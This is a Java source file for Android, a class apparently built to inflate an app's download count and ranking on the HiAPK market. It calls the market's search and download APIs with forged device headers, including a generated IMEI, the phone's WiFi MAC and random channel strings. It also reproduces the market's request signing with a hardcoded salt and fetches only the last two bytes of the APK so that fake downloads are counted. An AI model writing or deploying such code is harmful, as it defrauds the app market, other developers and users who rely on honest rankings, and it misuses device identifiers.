package com.umeng.ad.app;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Set;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.json.JSONObject;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;

import com.umeng.ad.app.u.TimeExtra;
import com.umeng.ad.app.utils.DocumentUtils;
import com.umeng.ad.app.utils.ElementUtils;
import com.umeng.ad.app.utils.SAXReader;

class MarketHiAPK extends Market {

	// private String header_ts = "4";

	public MarketHiAPK() {
	}

	MarketHiAPK(String packageName) {
		MARKET_NAME = MARKET_HIAPK;
		setPackageName(packageName);
	}

	@Override
	protected boolean prepareToRank(Context context) throws Exception {
		boolean result = false;
		TelephonyManager mTelephonyMgr = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = u.generateImei(mTelephonyMgr.getDeviceId());
		String verName = Build.VERSION.CODENAME;
		String verCode = Build.VERSION.SDK_INT + "";
		String brand = Build.BRAND;
		String wifiMac = u.getWifiMac(context);
		String keyword = getAppKeyword();
		List<String> resolutions = new ArrayList<String>();
		resolutions.add("480x800");
		resolutions.add("800x1280");
		resolutions.add("480x854");
		String resolution = resolutions.get((int) Math.random()
				* resolutions.size());

		HashMap<String, String> _headers = new HashMap<String, String>();

		int header_ts = generateNumForArea(2, 8);
		_headers.put("peer", "1");
		_headers.put("clientmarket", "1");
		_headers.put("sessionid", "");
		_headers.put("ts", header_ts + "");
		_headers.put("pv", "2.2");
		_headers.put("device", imei);
		_headers.put("mac", wifiMac);
		_headers.put("resolution", resolution);
		_headers.put("density", "240");
		_headers.put("sdkversion", verCode);
		_headers.put("vender", "17001");
		_headers.put("authorizations", "0");
		_headers.put("applang", "3");
		_headers.put("abi", "armeabi-v7a|armeabi");

		/**
		 * Search app on mobile phone
		 */
		String app_name = getAppKeyword();

		MLog.i("App_Name:" + app_name);
		app_name = URLEncoder.encode(app_name, "utf-8");
		String url = "http://market.hiapk.com/service/api2.php?qt=1005&type=5&key="
				+ app_name + "&pi=1&ps=20";
		JSONObject jsonObject = this.searchAPP(url, _headers);
		MLog.i("SearchAppResult:" + jsonObject);
		if (jsonObject == null) {
			MLog.w("Search App Result is null,return.");
			return false;
		}

		/**
		 * Get the download URL
		 */
		_headers.put("channel",
				u.generateRandCharNum(3) + "+" + u.generateRandCharNum(28));
		_headers.put("partial", "0");
		String theURL = jsonObject.getString("downurl");
		theURL = theURL + "&sign=" + generateSign(header_ts) + "&"
				+ getDownloadSignature();
		String downloadURL = this.getDownloadURL(theURL, _headers, jsonObject);

		MLog.i("downloadURL:" + downloadURL);

		if (downloadURL == null || !downloadURL.startsWith("http")) {
			MLog.w("downloadURL null return directly");
			return false;
		}
		/**
		 * Download APK on moblie
		 */
		jsonObject.put("apk_url", downloadURL);
		String range = jsonObject.getString("size");
		range = (Long.valueOf(range) - 2) + "-" + (Long.valueOf(range));
		jsonObject.put("apk_range", range);
		this.downloadOnMobile(jsonObject);

		/*-------------Download on web------------------*/
		String agent = u.randomAgent();
		String referer = "http://apk.hiapk.com//search?keyword="
				+ URLEncoder.encode(keyword, "utf-8") + "&type=0";
		jsonObject.put("download_referer", referer);
		/**
		 * Download Prepare on web
		 */
		this.downloadPre(agent, jsonObject);

		/**
		 * Download APK on web
		 */
		boolean downloadOk = this.download(agent, jsonObject);
		MLog.v("Terminaly the download result is :" + downloadOk);
		return downloadOk;
	}

	/**
	 * 
	 */
	private void downloadOnMobile(JSONObject jObject) {
		try {
			/**
			 * data
			 */
			String range = jObject.getString("apk_range");
			String url = jObject.getString("apk_url");

			HttpGet httpGet = new HttpGet(url);
			httpGet.addHeader("Range", "bytes=" + range);

			/**
			 * MLog.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Apache-HttpClient/UNAVAILABLE (java 1.4)' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					25 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 25 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params,
					"Apache-HttpClient/UNAVAILABLE (java 1.4)");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.d("downloadOnMobile:status_code:" + code);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 
	 */
	private boolean download(String agent, JSONObject jsonObject) {
		try {
			/**
			 * data
			 */
			String range = jsonObject.getString("apk_range");
			String url = jsonObject.getString("apk_url");
			String referer = jsonObject.getString("download_referer");

			HttpGet httpGet = new HttpGet(url);
			httpGet.addHeader("Range", "bytes=" + range);
			httpGet.addHeader("Referer", referer);

			/**
			 * MLog.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A " + agent + " ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					25 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 25 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, agent);
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.d("DownloadOnWeb StatusCode:" + code);

			if (code == HttpStatus.SC_PARTIAL_CONTENT) {
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	private JSONObject searchAPP(String url, HashMap<String, String> _headers) {
		try {
			HttpGet httpGet = new HttpGet(url);
			Set<String> keys = _headers.keySet();
			for (String key : keys) {
				httpGet.addHeader(key, _headers.get(key));
			}
			/**
			 * MLog.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Apache-HttpClient/UNAVAILABLE (java 1.4)' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params,
					"Apache-HttpClient/UNAVAILABLE (java 1.4)");
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.d("searchAPP status_code:" + code);

			InputStream inputstream = response.getEntity().getContent();
			InputStreamReader inputstreamreader = new InputStreamReader(
					inputstream, "utf-8");
			BufferedReader bufferedreader = new BufferedReader(
					inputstreamreader);

			StringBuffer lines = new StringBuffer();
			String line = "";
			while ((line = bufferedreader.readLine()) != null) {
				MLog.i(line);
				lines.append(line);
			}
			try {
				SAXReader reader = new SAXReader();
				Document doc;
				doc = reader.read(new ByteArrayInputStream(lines.toString()
						.getBytes("UTF-8")));
				Element root = DocumentUtils.getInstance().getRootElement(doc);
				String rootName = root.getNodeName();
				Element data = ElementUtils.getInstance().element(root,"data");
				List<Element> elements = ElementUtils.getInstance().elements(data);
				for (Element element : elements) {
					if (getPackageName().equals(ElementUtils.getInstance().elementText(element,"pkn"))) {

						JSONObject jsonObject = new JSONObject();
						jsonObject.put("id", ElementUtils.getInstance().elementText(element,"id"));// app_id
						jsonObject.put("pkn", ElementUtils.getInstance().elementText(element,"pkn"));
						jsonObject.put("name", ElementUtils.getInstance().elementText(element,"name"));// app_name
						jsonObject.put("size", ElementUtils.getInstance().elementText(element,"size"));// size
						jsonObject.put(
								"downurl",
								"http://market.hiapk.com/service"
										+ ElementUtils.getInstance().elementText(element,"downurl"));
						jsonObject.put("md5", ElementUtils.getInstance().elementText(element,"md5"));
						jsonObject.put("signature",
								ElementUtils.getInstance().elementText(element,"signature"));
						return jsonObject;
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	private String getDownloadURL(String url, HashMap<String, String> _headers,
			JSONObject jsonObject) {
		try {
			HttpGet httpGet = new HttpGet(url);
			Set<String> keys = _headers.keySet();
			for (String key : keys) {
				httpGet.addHeader(key, _headers.get(key));
			}
			/**
			 * MLog.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Apache-HttpClient/UNAVAILABLE (java 1.4)' ");
			curlString.append(url);

			MLog.d("\ngetDownloadURL:" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params,
					"Apache-HttpClient/UNAVAILABLE (java 1.4)");
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.d("getDownloadURLstatus_code:" + code);

			InputStream inputstream = response.getEntity().getContent();
			InputStreamReader inputstreamreader = new InputStreamReader(
					inputstream, "utf-8");
			BufferedReader bufferedreader = new BufferedReader(
					inputstreamreader);

			StringBuffer lines = new StringBuffer();
			String line = "";
			while ((line = bufferedreader.readLine()) != null) {
				MLog.i(line);
				lines.append(line);
			}
			inputstream.close();
			inputstreamreader.close();
			try {
				SAXReader reader = new SAXReader();
				Document doc;
				doc = reader.read(new ByteArrayInputStream(lines.toString()
						.getBytes()));
				Element root = DocumentUtils.getInstance().getRootElement(doc);
				String rootName = root.getNodeName();
				Element data = ElementUtils.getInstance().element(root,"data");
				List<Element> elements =ElementUtils.getInstance().elements(data);
				for (Element element : elements) {
					if (jsonObject.getString("id").equals(ElementUtils.getInstance().elementText(
							element,"aid"))) {
						String urlString = ElementUtils.getInstance().elementText(
								element,"downurl");
						if (urlString != null && urlString.startsWith("http")) {
							return urlString;
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	private void downloadPre(String agent, JSONObject jsonObject) {
		try {
			/**
			 * data
			 */
			String url = "http://apk.hiapk.com/Download?aid="
					+ jsonObject.getString("id")
					+ "&module=256&info=2Hkchw%3D%3D";
			String referer = jsonObject.getString("download_referer");
			String range = jsonObject.getString("size");
			range = (Long.valueOf(range) - 2) + "" + (Long.valueOf(range));

			HttpGet httpGet = new HttpGet(url);
			httpGet.addHeader("Referer", referer);
			httpGet.addHeader("Range", "bytes=" + range);

			/**
			 * MLog.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A " + agent + " ");
			curlString.append(url);
			MLog.i("\ndownloadPre:" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, agent);
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.d("downloadPre:status_code:" + code);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static Integer generateNumForArea(Integer min, Integer max) {
		if (min == max) {
			return min;
		}
		if (min > max) {
			int temp = min;
			min = max;
			max = temp;
		}
		Random rand = new Random();
		int randNumber = rand.nextInt(max - min + 1) + min;
		return randNumber;
	}

	public static void main(String[] args) {
		// System.out.println(new
		// MarketHiAPK("com.blsm.sft").generateSign(generateNumForArea(2, 8)));

		System.out.println(new MarketHiAPK("com.blsm.sft").generateSign(7));
	}

	private String generateSign(int number) {
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.append(number);
		stringBuilder.append("hiziyuan");
		String signstring = stringBuilder.toString();
		return MD5Utils.string2MD5(signstring).toLowerCase();
	}

	public String getDownloadSignature() {
		return "lowapkmd5=null&amp;type=1&amp;source=26";
	}

	@Override
	protected void initAllParams() {
		
	}

}
